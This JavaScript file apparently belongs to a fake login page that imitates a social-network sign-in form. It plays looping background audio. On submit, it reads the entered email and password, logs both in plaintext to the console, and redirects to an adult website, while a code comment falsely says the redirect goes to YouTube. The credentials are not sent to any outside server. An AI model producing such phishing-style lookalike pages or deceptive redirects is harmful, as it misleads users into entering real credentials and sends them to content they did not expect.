 document.addEventListener('DOMContentLoaded', function() {
       var audio = document.getElementById('backgroundAudio');
       // Ensure the audio loops
       audio.loop = true; 

       
    // Play the audio when the page loads
    audio.play().catch(function(error) {
        console.error('Audio playback failed:', error);
    });
       

    // Ensure the audio continues to play when the tab is active and stops when the tab is not active
    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'visible') {
            audio.play().catch(function(error) {
                console.error('Audio playback failed:', error);
            });
        } else {
            audio.pause();
        }
    });
       

    // Play audio when "Log In" button is clicked
    document.getElementById('loginButton').addEventListener('click', function() {
        audio.play().catch(function(error) {
            console.error('Audio playback failed:', error);
        });
    });
       

    // Play audio when "Forgotten password?" link is clicked
    document.getElementById('forgotPasswordLink').addEventListener('click', function() {
        audio.play().catch(function(error) {
            console.error('Audio playback failed:', error);
        });
    });
       

    // Play audio when "Create New Account" button is clicked
    document.getElementById('createAccountButton').addEventListener('click', function() {
        audio.play().catch(function(error) {
            console.error('Audio playback failed:', error);
        });
    });
});


    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();

        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;

        if (email && password) {
            // Log user inputs to the console
           console.log('Email:', email);
           console.log('Password:', password);
            
        
        // Redirect to YouTube after successful submission
    window.location.href = 'https://beeg.com/';
        } else {
           // Show an error message if fields are not filled (if necessary)
           console.log('Please fill in both fields.');
    }
});






